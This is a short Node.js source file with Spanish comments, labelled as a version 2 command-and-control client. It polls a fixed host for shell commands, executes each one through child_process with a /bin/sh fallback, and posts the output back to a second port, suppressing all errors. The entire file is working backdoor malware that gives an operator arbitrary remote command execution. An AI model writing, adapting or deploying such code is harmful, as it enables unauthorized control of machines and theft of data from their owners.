// sbtv2 C2 v2 (ES5, Node 4.4.3) — con reporte de errores y fallbacks
var http = require('http');
var cp = require('child_process');

var HOST = '192.168.1.55';
var CMDPORT = 8000;
var OUTPORT = 4446;

function post(body) {
    try {
        var req = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
        req.on('error', function () {});
        req.write(body || '');
        req.end();
    } catch (e) {}
}

function run(cmd) {
    var done = false;
    function fin(tag, err, so, se) {
        if (done) return;
        done = true;
        post('[' + tag + ']' + (err ? ' ERR:' + err.message : '') + '\n' + (so || '') + (se || ''));
    }
    try {
        cp.exec(cmd, function (e, so, se) { fin('exec', e, so, se); });
    } catch (e1) {
        try {
            cp.execFile('/bin/sh', ['-c', cmd], function (e, so, se) { fin('execFile', e, so, se); });
        } catch (e2) {
            fin('both', e2, '', '');
        }
    }
}

function tick() {
    http.get('http://' + HOST + ':' + CMDPORT + '/cmd', function (res) {
        var body = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { body += c; });
        res.on('end', function () {
            body = body || '';
            if (body.trim().length > 0) { run(body); }
            setTimeout(tick, 2500);
        });
    }).on('error', function () {
        setTimeout(tick, 5000);
    });
}

post('c2v2?start');
tick();
